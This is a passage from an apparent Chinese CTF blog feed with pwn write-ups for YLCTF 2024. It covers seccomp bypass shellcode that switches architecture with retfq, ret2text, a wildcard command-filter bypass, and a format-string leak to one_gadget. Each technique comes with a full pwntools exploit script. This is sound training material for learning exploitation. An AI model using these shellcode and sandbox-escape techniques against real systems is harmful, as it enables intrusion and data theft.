0009</span><br><span class="line"> 0004: 0x15 0x04 0x00 0x00000001  if (A == write) goto 0009</span><br><span class="line"> 0005: 0x15 0x03 0x00 0x00000005  if (A == fstat) goto 0009</span><br><span class="line"> 0006: 0x15 0x02 0x00 0x00000025  if (A == alarm) goto 0009</span><br><span class="line"> 0007: 0x15 0x01 0x00 0x000000e7  if (A == exit_group) goto 0009</span><br><span class="line"> 0008: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="line"> 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br></pre></td></tr></table></figure><p>open被禁了，但是32位下的open调用号是5号，刚好是64位fstat的调用号，并且这个沙箱并没有限制架构，所以可以转成32位后调用open，再转回64位执行read和write。</p><h3 id="shellcode（详细调试及手搓教程）"><a href="#shellcode（详细调试及手搓教程）" class="headerlink" title="shellcode（详细调试及手搓教程）"></a>shellcode（详细调试及手搓教程）</h3><h4 id="关掉alarm防止影响调试"><a href="#关掉alarm防止影响调试" class="headerlink" title="关掉alarm防止影响调试"></a>关掉alarm防止影响调试</h4><p><code>sed -i s/alarm/isnan/g ./msg_bot</code></p><p>将程序中的alarm替换为isnan，isnan函数不会影响程序的流程，这样就不会被alarm影响调试了。</p><h4 id="ae64和出现的问题"><a href="#ae64和出现的问题" class="headerlink" title="ae64和出现的问题"></a>ae64和出现的问题</h4><p>这道题还有个限制就是传进去的shellcode需要时可见字符，这里就需要用到一些工具来进行转换。可以用alpha3或者ae64，网上都有详细的介绍，我这里用的是ae64。</p><p>一般来说，要使用转架构的方式绕过沙盒，都需要一段可控地址的可执行内存，一般是使用mmap来获取，但是这个沙盒并没有给mmap。仔细观察发现执行shellcode的时候使以<code>call rax</code>的方式进行跳转的，而我们的shellcode就写在一段可执行的mmap内存里。地址是随机生成的，但是都控制在了四个字节以内。这意味这，虽然地址我们不能直接获取，但是保证了一定是一个32位也可用的地址，所以在手搓shellcode的时候可以注意从rax中获取地址。</p><p>ae64可以将一段64位汇编的shellcode转成只有可见字符组成的shellcode。其本质功能是生成一段shellcode，它可以通过各种计算将我原本的shellcode还原出来到内存中，并跳转执行。但是在使用调试过程中发现两个问题。假如我的代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">push rax</span><br><span class="line">pop rsi</span><br><span class="line">xor eax, eax</span><br><span class="line">push 0x7a</span><br><span class="line">pop rdx</span><br><span class="line">xor edi, edi</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><p>这很明显是一个read的系统调用。第一个问题可能是一个bug：ae64的shellcode执行完后，我的代码还原完毕，但是我发现我的syscall被还原成了不知道什么东西（punpckhdq那坨），导致这个read执行不成功。<img src="https://c-lby.top/images/2024YLCTF-1/%E9%94%99%E8%AF%AF%E8%BF%98%E5%8E%9F%E7%9A%84%E4%BB%A3%E7%A0%81.png" alt="错误还原的代码"></p><p>解决方法是，在syscall之前写几个nop。猜测可能和一定倍数对齐有关，没有深入探究。</p><p>第二个问题是，原本存在rax中的内存地址，会被还原代码的shellcode给破坏掉。也就是说，等到执行我的代码的时候，push rax也获取不到mmap的地址了。<img src="https://c-lby.top/images/2024YLCTF-1/rax%E8%A2%AB%E7%A0%B4%E5%9D%8F.png" alt="rax被破坏"></p><p>不过仔细观察可以发现这时候rsp刚好指向mmap出来的地址加上一定偏移。经过几次验证可以发现mmap的地址一定会以\x00结尾，并且rsp指向的这个地址和这块内存的基址偏移是固定的，所以我们就不需要push再pop了，直接pop rsi就可以了。</p><h4 id="写一个shellcode-loader"><a href="#写一个shellcode-loader" class="headerlink" title="写一个shellcode loader"></a>写一个shellcode loader</h4><p>结合前面两个问题，我们可以写出这段代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">sc1 = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xor eax, eax</span></span><br><span class="line"><span class="string">push 0x96</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string">xor edi, edi</span></span><br><span class="line"><span class="string">pop rsi</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">msg.msgcontent = AE64().encode(shellcode, strategy=<span class="string">&#x27;small&#x27;</span>) <span class="comment">#用AE64生成一段最短可见字符的生成sc1的shellcode</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>诶对了，为什么我们要写这个read的syscall呢？因为程序还限制了传入的shellcode长度不能超过199。其实准确来说是184，因为还要算上protobuf前面的数据内容。想要把整个完整shellcode都用ae64打包成可见字符shellcode是不可能的，光是上面这段代码打包后的数据包总长度就达到了157字节，所以最好的方法就是先写一个shellcode loader，然后再传入真正orw的shellcode，这样既没有长度也没有可见字符的限制。</p><h4 id="写一段32位的open系统调用"><a href="#写一段32位的open系统调用" class="headerlink" title="写一段32位的open系统调用"></a>写一段32位的open系统调用</h4><p>接下来我们要动调查看rsi是多少，我们接下来读入的第二段shellcode是从哪里开始读入的，rip下一步会从哪里开始执行，来确定接下来的shellcode该怎么写。pwndbg断点在mmap的地址可能会飞过去，所以我们断点在<code>call rax</code>(0x17C9)前，再单步执行到syscall处。<img src="https://c-lby.top/images/2024YLCTF-1/%E6%89%A7%E8%A1%8C%E5%8A%A0%E8%BD%BD%E5%99%A8%E6%97%B6%E6%9F%A5%E7%9C%8B%E5%81%8F%E7%A7%BB.png" alt="执行加载器时查看偏移"></p><p>此时rsi是0x*54，但是执行完syscall之后，rip会在0x*84（syscall占两个字节），能算出他们之间的偏移是0x30。所以传入下一段shellcode的时候要在payload前面加上一段0x30的padding。</p><h5 id="retfq"><a href="#retfq" class="headerlink" title="retfq"></a>retfq</h5><p>上面提到我们需要转架构成32位后执行open函数，具体来说我们需要借助<code>retf</code>这个汇编指令。网上有详细的介绍，但是我也是第一次遇到实际题目，所以还是写一下。<code>retf</code>这个指令等价于</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pop ip</span><br><span class="line">pop cs</span><br></pre></td></tr></table></figure><p>ip寄存器都很熟悉了，存放的时候retf结束后开始执行代码的地址。但是x86架构下的cs寄存器和8086里的用处已经不一样了。x86开始，cpu支持访问4G内存，CS寄存器作为代码段寄存器的意义已经不大了，在8086完成了它的使命之后，它被赋予了新的功能。对于retf这个指令来说，他可以控制我们需要切换的架构。cs为0x23的时候执行retf可以进入到32位模式，此时寄存器只有低32位可以使用，栈地址等也只能访问到32位地址。这也就是为什么我们需要一段32位地址的可执行内存来存放shellcode。cs为0x33的时候可以回到64位模式。</p><p>顺带一提，在8086中retf指令只是拿来转移cs段用的指令而已。</p><p>我们的间接可控地址现在在rsi寄存器里，别忘了这时候还是指向0x*54。所以我们需要将rsi加上一个值，让程序可以执行到后面的shellcode。这里我选择加0x3f，同时我在写payload的时候也会在这一段shellcode后面加上一些nop，这样就算我rsi跳到很后面了，我的代码也不会因执行不了而报错。因此，转架构可以写这样的代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">sc_to86 = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">nop /*可去除*/</span></span><br><span class="line"><span class="string">add rsi, 0x3f</span></span><br><span class="line"><span class="string">push 0x23</span></span><br><span class="line"><span class="string">push rsi</span></span><br><span class="line"><span class="string">retfq</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">sc = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span></span><br><span class="line">sc += asm(sc_to86, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">sc = sc.ljust(<span class="number">0x40</span>, <span class="string">b&#x27;\x90&#x27;</span>)</span><br></pre></td></tr></table></figure><p>这里用的不是retf而是retfq，其中q只是限定了字大小而已，64位下采用retfq，32位下还是用retf。顺带一提，加上的那个0x3f并不能乱取，其中的0x30是为了跳过前面那些padding，剩下的0xf至少要保证能够跳过sc_to86这一段code。也就是说这个0xf可以更大，但是不能小到这段code都跳不过。ljust中的0x40要保证大于等于code中的0x3f。然后接下来就是写一段32位的open调用：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">sc_open = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">add esi,0x1b0</span></span><br><span class="line"><span class="string">mov esp, esi</span></span><br><span class="line"><span class="string">push 0</span></span><br><span class="line"><span class="string">push 0x67616c66</span></span><br><span class="line"><span class="string">mov ebx, esp</span></span><br><span class="line"><span class="string">xor ecx, ecx</span></span><br><span class="line"><span class="string">mov eax,5</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">sc += asm(sc_open, arch=<span class="string">&#x27;i386&#x27;</span>)</span><br></pre></td></tr></table></figure><p>open在32位下的系统调用号是5。这里给esi又加上了一些偏移赋给了esp，这里是给系统调用开辟栈空间，一样是使用mmap的内存，一存多用。注意32的传参寄存器和64位不一样。</p><h4 id="写一段64位的rw系统调用"><a href="#写一段64位的rw系统调用" class="headerlink" title="写一段64位的rw系统调用"></a>写一段64位的rw系统调用</h4><p>首先需要先转换回64位，因为沙盒只开放了64位的read和write供我们使用。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sc_to64 = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">sub esi, 0x1b0</span></span><br><span class="line"><span class="string">add esi, 0x28</span></span><br><span class="line"><span class="string">push 0x33</span></span><br><span class="line"><span class="string">push esi</span></span><br><span class="line"><span class="string">retf</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">sc += asm(sc_to64, arch=<span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line">sc = sc.ljust(<span class="number">0x68</span>, <span class="string">b&#x27;\x90&#x27;</span>)</span><br></pre></td></tr></table></figure><p>这里把之前当栈地址使用的esi寄存器还原，并加上一点偏移给到IP寄存器。这里同理，这里的0x28至少要保证跳过sc_open+sc_to64两段code。然后加一些nop来作为padding。下面就正常写rw的shellcode即可，这里我们需要一个地方来存放我们的flag，只要将rsi寄存器加上一点偏移就行。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">sc_rw = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">add rsi, 0x50</span></span><br><span class="line"><span class="string">mov rdi, 3</span></span><br><span class="line"><span class="string">mov rdx, 0x60</span></span><br><span class="line"><span class="string">xor rax, rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdx, 0x60</span></span><br><span class="line"><span class="string">mov rdi, 1</span></span><br><span class="line"><span class="string">mov rax, 1</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">sc += asm(sc_rw, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br></pre></td></tr></table></figure><p>最后把sc发上去就能顺利打印出flag了。到此为止，这道题就结束了。</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> bot_pb2 <span class="keyword">as</span> pb</span><br><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># e = ELF(&#x27;./msg_bot&#x27;)</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sc1 = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xor eax, eax</span></span><br><span class="line"><span class="string">push 0x96</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string">xor edi, edi</span></span><br><span class="line"><span class="string">pop rsi</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">sc_to86 = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">add rsi, 0x3f</span></span><br><span class="line"><span class="string">push 0x23</span></span><br><span class="line"><span class="string">push rsi</span></span><br><span class="line"><span class="string">retfq</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">sc_open = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">add esi,0x1b0</span></span><br><span class="line"><span class="string">mov esp, esi</span></span><br><span class="line"><span class="string">push 0</span></span><br><span class="line"><span class="string">push 0x67616c66</span></span><br><span class="line"><span class="string">mov ebx, esp</span></span><br><span class="line"><span class="string">xor ecx, ecx</span></span><br><span class="line"><span class="string">mov eax,5</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">sc_to64 = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">sub esi, 0x1b0</span></span><br><span class="line"><span class="string">add esi, 0x28</span></span><br><span class="line"><span class="string">push 0x33</span></span><br><span class="line"><span class="string">push esi</span></span><br><span class="line"><span class="string">retf</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">sc_rw = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">add rsi, 0x50</span></span><br><span class="line"><span class="string">mov rdi, 3</span></span><br><span class="line"><span class="string">mov rdx, 0x60</span></span><br><span class="line"><span class="string">xor rax, rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdx, 0x60</span></span><br><span class="line"><span class="string">mov rdi, 1</span></span><br><span class="line"><span class="string">mov rax, 1</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode = asm(sc1, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sc = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span></span><br><span class="line">sc += asm(sc_to86, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">sc = sc.ljust(<span class="number">0x40</span>, <span class="string">b&#x27;\x90&#x27;</span>)</span><br><span class="line">sc += asm(sc_open, arch=<span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line">sc += asm(sc_to64, arch=<span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line">sc = sc.ljust(<span class="number">0x68</span>, <span class="string">b&#x27;\x90&#x27;</span>)</span><br><span class="line">sc += asm(sc_rw, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(shellcode)</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./msg_bot&#x27;</span>)</span><br><span class="line"><span class="comment"># r = remote(&quot;challenge.yuanloo.com&quot;, 41741)</span></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;botmsg&#x27;</span>)</span><br><span class="line"></span><br><span class="line">msg = pb.msgbot()</span><br><span class="line">msg.msgid = <span class="number">0xC0DEFEED</span></span><br><span class="line">msg.msgsize = <span class="number">0xF00DFACE</span></span><br><span class="line">msg.msgcontent = AE64().encode(shellcode, strategy=<span class="string">&#x27;small&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(msg.SerializeToString()))</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">r.send(msg.SerializeToString())</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">r.send(sc)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>WP看着短，实际因为本人平时shellcode练习太少，这道题花了差不多一天才浑浑噩噩地做出来。我也不知道哪里来的毅力和意志，能为了一道题花了几乎一整个白天肝了出来。从一开始毫无思路、工具调不对、思路错误、因为没有mmap调用而红温、数据包长度不对、shellcode执行报错、这样那样的各种问题，到能坚持到打通拿到flag，真是觉得不可思议（而且此时其他题并还没有ak，只是看到了protobuf就来做做了）。不过确实算是一个很宝贵的经验，学到了很多之前没接触过的shellcode思路和绕过方法，也告诉了我自己的薄弱点在哪里。一开始不理解为什么前9个大佬为什么能这么快就做出来，做出来才发现其实不难，重要的是经验，真到大型赛事的时候，不可能有这么多时间给我来像这样一点点推演的。</p><p>还得练</p>]]></content>
    
    
    <summary type="html">做了一天，我太菜了</summary>
    
    
    
    <category term="WP" scheme="https://c-lby.top/categories/WP/"/>
    
    
    <category term="CTF" scheme="https://c-lby.top/tags/CTF/"/>
    
    <category term="PWN" scheme="https://c-lby.top/tags/PWN/"/>
    
    <category term="WP" scheme="https://c-lby.top/tags/WP/"/>
    
    <category term="protobuf" scheme="https://c-lby.top/tags/protobuf/"/>
    
  </entry>
  
  <entry>
    <title>『YLCTF 源鲁杯 2024』 PWN-1 WP</title>
    <link href="https://c-lby.top/2024/2024YLCTF-1/"/>
    <id>https://c-lby.top/2024/2024YLCTF-1/</id>
    <published>2024-10-12T08:14:56.000Z</published>
    <updated>2024-10-23T15:26:31.046Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-giaopwn"><a href="#0x00-giaopwn" class="headerlink" title="0x00 giaopwn"></a>0x00 giaopwn</h2><p>ret2text，没什么好讲的。有个cat flag的字符串，直接用。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&quot;challenge.yuanloo.com&quot;</span>, <span class="number">41537</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">rdi = <span class="number">0x400743</span></span><br><span class="line">flag = <span class="number">0x601048</span></span><br><span class="line">system = <span class="number">0x4006D2</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(rdi)+p64(flag)+p64(system)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x01-ezstack"><a href="#0x01-ezstack" class="headerlink" title="0x01 ezstack"></a>0x01 ezstack</h2><p>栈溢出+rce字符过滤。这道题的做法挺多的。过滤了c、f、s、h，且只能写十个字节。Linux万物皆文件，是文件就能用通配符进行模糊匹配。比如flag可以写成*lag。那cat咋办呢，cat命令本身指向&#x2F;bin&#x2F;cat这个文件，那么一样可以用&#x2F;bin&#x2F;*at来匹配。cat是个命令，所以直接*at是不行的。</p><p>还要注意一下栈平衡的问题。另外就是这里只能写十个字节，写完<code>/bin/\*at </code>就只剩一个位置写*了，所以会把当前目录下所有东西都打印出来，flag也包括在里面，得找一找。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&#x27;challenge.yuanloo.com&#x27;</span>, <span class="number">48489</span>)</span><br><span class="line"><span class="comment"># r = process(&#x27;./ezstack&#x27;)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./ezstack&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line">vuln = <span class="number">0x401275</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span>+p64(ret)+p64(vuln)</span><br><span class="line">r.send(payload)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;input your command\n&#x27;</span>)</span><br><span class="line">r.send(<span class="string">b&#x27;/bin/?at *&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>另外我的学弟Garhin师傅利用<code>$0</code>直接getshell了，tql。然后想到<code>/bin/ba??</code>这样的形式应该也是能getshell的，所以这道题解法应该有很多。</p><h2 id="0x02-ez-fmt"><a href="#0x02-ez-fmt" class="headerlink" title="0x02  ez_fmt"></a>0x02  ez_fmt</h2><p>栈上fmt+栈溢出。泄露libc之后直接溢出到ogg就行了，不用劫持got表。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&quot;challenge.yuanloo.com&quot;</span>, <span class="number">21821</span>)</span><br><span class="line"><span class="comment"># r = process(&quot;./pwn&quot;)</span></span><br><span class="line">e = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.31.so&quot;</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&quot;./libc.so.6&quot;)</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line">main = <span class="number">0x4011DD</span></span><br><span class="line">vuln = <span class="number">0x40120D</span></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;YLCTF\n&#x27;</span>)</span><br><span class="line">r.send(<span class="string">b&#x27;%13$p&#x27;</span>.ljust(<span class="number">0x28</span>, <span class="string">b&#x27;\x00&#x27;</span>)+p64(vuln))</span><br><span class="line">libc_base = <span class="built_in">int</span>(r.recv(<span class="number">14</span>), <span class="number">16</span>)-libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]-<span class="number">243</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">ogg = libc_base+<span class="number">0xe3b01</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># r.recvuntil(b&#x27;YLCTF\n&#x27;)</span></span><br><span class="line">r.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x27</span>+<span class="string">b&#x27;\x00&#x27;</span>+p64(ogg))</span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x03-ezorw"><a href="#0x03-ezorw" class="headerlink" title="0x03 ezorw"></a>0x03 ezorw</h2><p>沙箱shellcode。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x0b 0xc000003e  if (A != ARCH_X86_64) goto 0013</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005</span><br><span class="line"> 0004: 0x15 0x00 0x08 0xffffffff  if (A != 0xffffffff) goto 0013</span><br><span class="line"> 0005: 0x15 0x07 0x00 0x00000000  if (A == read) goto 0013</span><br><span class="line"> 0006: 0x15 0x06 0x00 0x00000001  if (A == write) goto 0013</span><br><span class="line"> 0007: 0x15 0x05 0x00 0x00000002  if (A == open) goto 0013</span><br><span class="line"> 0008: 0x15 0x04 0x00 0x00000013  if (A == readv) goto 0013</span><br><span class="line"> 0009: 0x15 0x03 0x00 0x00000014  if (A == writev) goto 0013</span><br><span class="line"> 0010: 0x15 0x02 0x00 0x00000142  if (A == execveat) goto 0013</span><br><span class="line"> 0011: 0x15 0x01 0x00 0x0000024f  if (A == 0x24f) goto 0013</span><br><span class="line"> 0012: 0x06 